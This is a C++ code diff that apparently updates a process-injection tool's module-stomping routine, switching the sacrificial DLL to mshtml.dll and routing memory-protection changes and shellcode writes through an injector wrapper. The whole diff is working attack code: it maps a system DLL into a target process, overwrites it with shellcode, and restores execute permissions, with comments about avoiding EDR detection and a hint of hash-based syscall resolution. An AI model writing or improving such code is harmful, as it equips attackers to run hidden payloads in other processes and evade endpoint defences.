@@ -4,10 +4,11 @@
 PVOID GetStompedAddress(HANDLE targetProcess, char* shellcode, size_t shellcodeSize) {
     HMODULE hNtdll = GetModuleHandleA("ntdll");
     auto fNtCreateSection = (myNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
+    //auto fNtCreateSectionStruct = syscallHandler.getSyscallDataByHash(L"ntdll.dll", 3492683984);
     auto fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
 
     // 1. Create the Section from the DLL
-    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\wpdshext.dll", GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\mshtml.dll", GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return nullptr;
 
     HANDLE hSection = NULL;
@@ -32,23 +33,34 @@ PVOID GetStompedAddress(HANDLE targetProcess, char* shellcode, size_t shellcodeS
 
     // 3. FORCE permissions change (Fixes Error 998)
     DWORD oldProtect;
-    if (!VirtualProtectEx(targetProcess, remoteBase, shellcodeSize, PAGE_READWRITE, &oldProtect)) {
-        std::cerr << "[-] VirtualProtectEx (RW) failed: " << GetLastError() << "\n";
+    if (mainInjector.protectMemFlag(targetProcess, remoteBase, PAGE_READWRITE, remoteViewSize)) {
+        std::cerr << "[-] VirtualProtectEx failed: " << GetLastError() << "\n";
         return nullptr;
     }
 
-    // 4. Write the bytes
+    // 2. Clear the memory first (Optional but helps with stability)
+    // Some EDRs look for 'residue' from the original DLL
+    // memset(buffer, 0, shellcodeSize); 
+
+    // 3. Write the bytes
     SIZE_T bytesWritten = 0;
-    if (!WriteProcessMemory(targetProcess, remoteBase, shellcode, shellcodeSize, &bytesWritten)) {
-        std::cerr << "[-] WriteProcessMemory failed: " << GetLastError() << "\n";
+    // We use the exact shellcodeSize here
+    if (mainInjector.wrMem(targetProcess, remoteBase, shellcode, shellcodeSize)) {
+        DWORD err = GetLastError();
+        if (err == 299) {
+            std::cerr << "[-] Partial write (299). Shellcode size (" << shellcodeSize
+                << ") might exceed the RW protection range.\n";
+        }
+        else {
+            std::cerr << "[-] WriteProcessMemory failed: " << err << "\n";
+        }
+        mainInjector.protectMemFlag(targetProcess, remoteBase, PAGE_EXECUTE_READ, remoteViewSize);
         return nullptr;
     }
 
-    // 5. Restore permissions to RX
-    VirtualProtectEx(targetProcess, remoteBase, shellcodeSize, oldProtect, &oldProtect);
+    // 4. Restore protection to original
+    mainInjector.protectMemFlag(targetProcess, remoteBase, PAGE_EXECUTE_READ, remoteViewSize);
 
     std::cout << "[+] Successfully stomped " << bytesWritten << " bytes at base.\n";
-
-    CloseHandle(hSection);
     return remoteBase;
 }
